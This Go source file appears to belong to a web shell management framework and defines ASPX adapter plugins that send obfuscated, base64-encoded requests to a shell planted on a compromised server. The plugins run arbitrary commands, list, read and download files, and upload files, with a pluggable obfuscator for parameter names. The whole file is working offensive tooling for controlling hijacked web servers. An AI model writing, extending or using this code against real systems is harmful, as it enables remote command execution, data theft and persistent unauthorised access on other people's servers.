package aspx

import (
	"context"
	"errors"
	"strings"

	"github.com/Yliken/redbeanshellcore/core"
)

type aspxInfo struct{ obf *Obfuscator }
func NewAspxInfo() *aspxInfo { return &aspxInfo{obf: DefaultObfuscator()} }
func (p *aspxInfo) WithObfuscator(obf *Obfuscator) *aspxInfo { p.obf = obf; return p }
func (p *aspxInfo) Name() string { return "info" }
func (p *aspxInfo) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspxInfo) Build(_ context.Context, sess *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.Info())
	req.Meta["adapter"] = "aspx"; _ = sess; return req, nil
}
func (p *aspxInfo) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxInfo.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseInfo(resp.Body), nil
}

type aspxExec struct{ cmd string; bin string; envars map[string]string; obf *Obfuscator }
func NewAspxExec(cmd string) *aspxExec { return &aspxExec{cmd: cmd, obf: DefaultObfuscator()} }
func (p *aspxExec) WithObfuscator(obf *Obfuscator) *aspxExec { p.obf = obf; return p }
func (p *aspxExec) Name() string { return "exec" }
func (p *aspxExec) RiskLevel() core.RiskLevel { return core.RiskExec }
func (p *aspxExec) WithBin(bin string) *aspxExec { p.bin = bin; return p }
func (p *aspxExec) WithEnv(k, v string) *aspxExec {
	if p.envars == nil { p.envars = make(map[string]string) }; p.envars[k] = v; return p
}

func (p *aspxExec) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.Exec())
	req.SetParam(p.obf.Param1(), []byte(b64(p.cmd)))
	req.Meta["adapter"] = "aspx"; return req, nil
}
func (p *aspxExec) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxExec.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseExec(resp.Body), nil
}

type aspxFileList struct{ target string; obf *Obfuscator }
func NewAspxFileList(path string) *aspxFileList {
	if path == "" { path = "/" }; return &aspxFileList{target: path, obf: DefaultObfuscator()}
}
func (p *aspxFileList) WithObfuscator(obf *Obfuscator) *aspxFileList { p.obf = obf; return p }
func (p *aspxFileList) Name() string { return "file.list" }
func (p *aspxFileList) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspxFileList) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.FileList())
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "aspx"; return req, nil
}
func (p *aspxFileList) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxFileList.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileList(p.target, resp.Body), nil
}

type aspxFileRead struct{ target string; obf *Obfuscator }
func NewAspxFileRead(path string) *aspxFileRead { return &aspxFileRead{target: path, obf: DefaultObfuscator()} }
func (p *aspxFileRead) WithObfuscator(obf *Obfuscator) *aspxFileRead { p.obf = obf; return p }
func (p *aspxFileRead) Name() string { return "file.read" }
func (p *aspxFileRead) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspxFileRead) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.FileRead())
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "aspx"; return req, nil
}
func (p *aspxFileRead) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxFileRead.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

type aspxFileDownload struct{ target string; obf *Obfuscator }
func NewAspxFileDownload(path string) *aspxFileDownload { return &aspxFileDownload{target: path, obf: DefaultObfuscator()} }
func (p *aspxFileDownload) WithObfuscator(obf *Obfuscator) *aspxFileDownload { p.obf = obf; return p }
func (p *aspxFileDownload) Name() string { return "file.download" }
func (p *aspxFileDownload) RiskLevel() core.RiskLevel { return core.RiskReadOnly }

func (p *aspxFileDownload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.FileDownload())
	req.SetParam(p.obf.Param1(), []byte(b64(p.target)))
	req.Meta["adapter"] = "aspx"; return req, nil
}
func (p *aspxFileDownload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxFileDownload.Parse: response is nil") }
	if err := parseRemoteError(p.Name(), resp); err != nil { return nil, err }
	return parseFileRead(p.Name(), p.target, resp.Body), nil
}

type aspxFileUpload struct{ remote string; content []byte; obf *Obfuscator }
func NewAspxFileUpload(r string, c []byte) *aspxFileUpload { return &aspxFileUpload{remote: r, content: c, obf: DefaultObfuscator()} }
func (p *aspxFileUpload) WithObfuscator(obf *Obfuscator) *aspxFileUpload { p.obf = obf; return p }
func (p *aspxFileUpload) Name() string { return "file.upload" }
func (p *aspxFileUpload) RiskLevel() core.RiskLevel { return core.RiskWrite }

func (p *aspxFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request, error) {
	req := core.NewRequest(p.Name())
	tpl := &ASPXTemplates{}; req.Payload = []byte(tpl.FileUpload())
	req.SetParam(p.obf.Param1(), []byte(b64(p.remote)))
	req.SetParam(p.obf.Param2(), []byte(b64(string(p.content))))
	req.Meta["adapter"] = "aspx"; return req, nil
}
func (p *aspxFileUpload) Parse(_ context.Context, resp *core.Response) (core.Result, error) {
	if resp == nil { return nil, errors.New("aspxFileUpload.Parse: response is nil") }
	t := strings.TrimSpace(string(resp.Body))
	ok := t == "1" || t == "ok"
	return &core.BoolResult{BaseResult: core.NewBaseResult("file.upload", resp.Body), OK: ok, Message: t}, nil
}

func b64(s string) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	if s == "" { return "" }
	var out []byte; b := []byte(s); n := len(b)
	for i := 0; i < n; i += 3 {
		var v, pad int
		switch {
		case i+2 < n: v = int(b[i])<<16 | int(b[i+1])<<8 | int(b[i+2])
		case i+1 < n: v = int(b[i])<<16 | int(b[i+1])<<8; pad = 1
		default: v = int(b[i]) << 16; pad = 2
		}
		out = append(out, chars[(v>>18)&63], chars[(v>>12)&63])
		if pad < 2 { out = append(out, chars[(v>>6)&63]) } else { out = append(out, '=') }
		if pad < 1 { out = append(out, chars[v&63]) } else { out = append(out, '=') }
	}
	return string(out)
}
